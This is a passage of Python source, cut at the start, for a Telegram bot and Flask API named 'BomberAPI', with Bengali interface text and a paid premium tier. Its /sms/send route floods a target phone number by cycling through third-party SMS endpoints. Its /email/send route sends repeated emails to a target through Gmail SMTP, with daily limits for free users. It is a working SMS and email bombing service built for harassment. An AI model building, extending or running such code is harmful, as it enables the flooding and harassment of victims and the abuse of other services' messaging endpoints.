    mk.add(InlineKeyboardButton("👑 Make Premium",callback_data="adm_mk"),
           InlineKeyboardButton("🚫 Remove Premium",callback_data="adm_rm"),
           InlineKeyboardButton("📋 Users List",callback_data="adm_list"))
    bot.send_message(msg.chat.id,"🛠 *Admin Panel*",reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("adm_"))
def cb_admin(call):
    cid=call.message.chat.id
    if not is_admin(cid): return
    if call.data=="adm_list":
        users=fb_get("users") or {}
        txt="📋 *Users:*\n\n"
        for uid,ud in list(users.items())[:20]:
            txt+=f"{'👑' if ud.get('premium') else '🆓'} `{uid}` — {ud.get('email','?')}\n"
        bot.edit_message_text(txt,cid,call.message.message_id); return
    user_state[cid]={"step":"adm_mk" if call.data=="adm_mk" else "adm_rm"}
    lbl="Make Premium" if call.data=="adm_mk" else "Remove Premium"
    bot.edit_message_text(f"*{lbl}*\n\nChat ID দিন:",cid,call.message.message_id)

@bot.message_handler(func=lambda m: user_state.get(m.chat.id,{}).get("step") in ("adm_mk","adm_rm"))
def handle_admin_input(msg):
    cid=msg.chat.id; target=(msg.text or "").strip(); step=user_state.get(cid,{}).get("step")
    u=fb_get(f"users/{target}")
    if not u: bot.send_message(cid,f"❌ `{target}` পাওয়া যায়নি।"); user_state.pop(cid,None); return
    fb_set(f"users/{target}/premium", step=="adm_mk")
    lbl="Premium করা হয়েছে ✅" if step=="adm_mk" else "Premium সরানো হয়েছে 🚫"
    bot.send_message(cid,f"`{target}` — {lbl}")
    try:
        notice="🎉 আপনাকে Premium করা হয়েছে!" if step=="adm_mk" else "ℹ️ আপনার Premium সরানো হয়েছে।"
        bot.send_message(int(target),notice)
    except: pass
    user_state.pop(cid,None)

# ══════════════════════════════════════════════════════════════
# BACK / FALLBACK
# ══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text=="🔙 Back to Menu")
def handle_back(msg): user_state.pop(msg.chat.id,None); bot.send_message(msg.chat.id,"মেনু:",reply_markup=main_kb())

@bot.message_handler(func=lambda m: True)
def fallback(msg):
    cid=msg.chat.id
    if not get_user(cid).get("email"): show_auth(cid)
    else: bot.send_message(cid,"মেনু থেকে বেছে নিন:",reply_markup=main_kb())

# ══════════════════════════════════════════════════════════════
# FLASK ROUTES  (external API)
# ══════════════════════════════════════════════════════════════
def ok_r(**kw):  return jsonify({"ok":True,**kw})
def err_r(m,c=400): return jsonify({"ok":False,"error":m}),c

def api_guard(data):
    key=data.get("api_key","")
    if not key: return None,None,err_r("api_key required")
    u,cid=check_api_key(key)
    if not u: return None,None,err_r("Invalid API key",401)
    return u,cid,None

@app.route("/",methods=["GET"])
def health(): return ok_r(service="BomberAPI",status="running")

@app.route("/mail/create",methods=["POST"])
def route_mail_create():
    data=request.json or {}
    u,cid,e=api_guard(data)
    if e: return e
    custom=data.get("custom")
    if custom: custom=re.sub(r'[^a-z0-9]','',custom.lower())[:20]
    result=create_temp_mail(custom)
    if not result: return err_r("All mail providers failed.")
    return ok_r(email=result["email"],token=result["token"],base=result["base"])

@app.route("/mail/inbox",methods=["POST"])
def route_mail_inbox():
    data=request.json or {}
    u,cid,e=api_guard(data)
    if e: return e
    token=data.get("token",""); base=data.get("base","https://api.mail.tm")
    if not token: return err_r("token required")
    msgs=fetch_inbox(token,base)
    return ok_r(messages=msgs)

@app.route("/sms/send",methods=["POST"])
def route_sms():
    data=request.json or {}
    u,cid,e=api_guard(data)
    if e: return e
    number=data.get("number","").strip()
    if not number: return err_r("number required")
    u=reset_daily(u,cid)
    if not is_premium(u) and u.get("sms_today",0)>=FREE_SMS_DAILY:
        return err_r(f"Daily limit ({FREE_SMS_DAILY}) reached. Upgrade: {CONTACT_TG}",429)
    apis=get_sms_apis(number)
    hdrs={"User-Agent":"Mozilla/5.0","Accept":"application/json"}
    for api in apis:
        try:
            if api["method"]=="POST":
                r=requests.post(api["url"],json=api.get("json"),data=api.get("data"),headers=hdrs,timeout=8)
            else: r=requests.get(api["url"],headers=hdrs,timeout=8)
            if r.status_code in (200,201,202):
                u["sms_today"]=u.get("sms_today",0)+1; u["total_sms"]=u.get("total_sms",0)+1
                save_user(cid,u); return ok_r(source=api["name"])
        except: continue
    return err_r("All SMS providers failed.")

@app.route("/email/send",methods=["POST"])
def route_email():
    data=request.json or {}
    u,cid,e=api_guard(data)
    if e: return e
    to=data.get("to",""); subject=data.get("subject",""); body=data.get("body","")
    count=max(1,min(int(data.get("count",1)),FREE_EMAIL_DAILY))
    fe=data.get("from_email") or FREE_SENDER_EMAIL
    fp=data.get("from_pass")  or FREE_SENDER_PASS
    if not all([to,subject,body,fe,fp]): return err_r("to,subject,body,from_email,from_pass required")
    u=reset_daily(u,cid)
    if not is_premium(u) and (u.get("email_today",0)+count)>FREE_EMAIL_DAILY:
        return err_r(f"Daily email limit ({FREE_EMAIL_DAILY}) reached.",429)
    sent=0
    try:
        srv=smtplib.SMTP("smtp.gmail.com",587); srv.ehlo(); srv.starttls(); srv.login(fe,fp)
        for _ in range(count):
            srv.sendmail(fe,to,f"From:{fe}\nTo:{to}\nSubject:{subject}\n\n{body}"); sent+=1
        srv.quit()
    except Exception as ex: return err_r(str(ex))
    u["email_today"]=u.get("email_today",0)+sent; u["total_email"]=u.get("total_email",0)+sent
    save_user(cid,u); return ok_r(sent=sent)

# ══════════════════════════════════════════════════════════════
# STARTUP — bot polls in background thread, gunicorn serves Flask
# gunicorn must use --workers 1 --preload to avoid duplicate bots
# ══════════════════════════════════════════════════════════════
def _run_bot():
    while True:
        try:
            print("🤖 Bot polling started...")
            bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=20)
        except Exception as ex:
            print(f"⚠️ Bot crashed: {ex} — restarting in 5s...")
            time.sleep(5)

# Start bot only once — guard against gunicorn worker re-imports
_BOT_STARTED = os.environ.get("_BOT_STARTED_PID")
_MY_PID      = str(os.getpid())

if _BOT_STARTED != _MY_PID:
    os.environ["_BOT_STARTED_PID"] = _MY_PID
    bot_thread = threading.Thread(target=_run_bot, daemon=True)
    bot_thread.start()
    print(f"✅ Bot thread launched from PID {_MY_PID}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)), debug=False)
